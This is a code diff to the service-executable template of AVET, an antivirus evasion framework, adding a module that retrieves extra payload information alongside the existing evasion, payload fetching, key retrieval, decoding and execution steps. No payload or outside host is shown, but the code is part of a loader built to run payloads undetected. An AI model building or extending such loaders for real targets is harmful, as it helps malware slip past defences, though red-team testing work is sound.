@@ -51,6 +51,7 @@ Web: https://github.com/govolution/avet
 #include "evasion/evasion.include"
 #include "get_payload/get_payload.include"
 #include "get_key/get_key.include"
+#include "get_payload_info/get_payload_info.include"
 #include "decode_payload/decode_payload.include"
 #include "payload_execution_method/payload_execution_method.include"
 
@@ -146,6 +147,7 @@ void ServiceMain(int argc, char **argv) {
 	// Function prototype pointers to store selected functions.	
 	unsigned char *(*get_payload) (char *arg1, int *payload_size) = NULL;
 	unsigned char *(*get_key) (char *arg1, int *key_length) = NULL;
+	unsigned char *(*get_payload_info) (char *arg1, int *payload_info_length) = NULL;
 	void (*decode_payload) (const unsigned char *ciphertext, const int ciphertext_length, const unsigned char *key, const int key_length, unsigned char *plaintext) = NULL;
 	void (*payload_execution_method) (unsigned char *payload) = NULL;
 	
@@ -164,6 +166,7 @@ void ServiceMain(int argc, char **argv) {
 	#include "evasion/evasion.assign"
 	#include "get_payload/get_payload.assign"
 	#include "get_key/get_key.assign"
+	#include "get_payload_info/get_payload_info.assign"
 	#include "decode_payload/decode_payload.assign"
 	#include "payload_execution_method/payload_execution_method.assign"
 			
@@ -213,6 +216,24 @@ void ServiceMain(int argc, char **argv) {
 		DEBUG_PRINT("\n\n");
 	} else {
 		DEBUG_PRINT("No key retrieved.\n");
+	}
+	
+	// Retrieve additional payload info
+	int payload_info_length = 0;
+	// If payload info is retrieved statically, set the argument accordingly to ensure that the correct data is delivered
+	#ifdef STATIC_PAYLOAD_INFO
+	unsigned char *payload_info = get_payload_info("static_payload_info", &payload_info_length);
+	#else
+	unsigned char *payload_info = get_payload_info(argv[3], &payload_info_length);
+	#endif
+	if(payload_info != NULL) {
+		DEBUG_PRINT("Retrieved additional payload info, info data length is %d bytes.\n", payload_info_length);
+		for(int i = 0; i < payload_info_length; i++) {
+			DEBUG_PRINT("%02x ", payload_info[i]);
+		}
+		DEBUG_PRINT("\n\n");
+	} else {
+		DEBUG_PRINT("No additional payload info retrieved.\n");
 	}
 		
 	// Decode payload
